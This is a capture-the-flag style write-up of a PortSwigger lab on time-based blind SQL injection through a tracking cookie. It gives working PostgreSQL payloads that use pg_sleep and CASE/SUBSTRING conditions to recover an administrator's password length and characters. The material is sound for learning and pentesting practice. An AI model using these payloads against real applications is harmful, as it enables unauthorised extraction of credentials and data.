# Lab 15 — Blind SQL Injection with Time Delays and Information Retrieval

**Difficulty:** Practitioner
**Technique:** Blind SQLi — time-based data extraction
**Lab URL:** https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval

---

## Vulnerability

The application is vulnerable to blind SQL injection via a tracking cookie. Building on Lab 14 (time delays confirming SQLi), this lab uses time delays to extract actual data from the database. When the application gives no visible output, no errors, and no behavioural differences — response time becomes the only signal available.

---

## Steps Taken

1. Confirmed time-based blind SQLi using a sleep payload (as in Lab 14) — 10 second delay confirmed injection
2. Constructed conditional time-delay queries to test character values
3. If the condition is TRUE — delay triggers — confirming the character match
4. If the condition is FALSE — response returns immediately — rejecting the character
5. Extracted the administrator password character by character using this timing signal
6. Logged in with the extracted credentials

---

## Payload Logic

**Confirm SQLi (from Lab 14):**
```
TrackingId=xyz'||pg_sleep(10)--
```
10 second delay = confirmed injection point.

**Extract password character by character:**
```
TrackingId=xyz'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,1,1)='a')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```
- Condition TRUE (character matches) → 10 second delay
- Condition FALSE (wrong character) → instant response

**Determine password length first:**
```
TrackingId=xyz'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
```
Increment until no delay — that length is confirmed.

---

## Real-World Impact

Time-based extraction works as long as injection exists — regardless of how locked down the application appears. No output, no errors, no messages needed. Just time. In practice, automated tools handle character-by-character extraction but understanding the manual process is essential for writing accurate pentest reports.

---

## Key Takeaway

Response time is always available as a signal — it cannot be filtered or sanitised away. Time-based blind SQLi exploits this unavoidable channel to extract complete databases from applications with zero visible output.
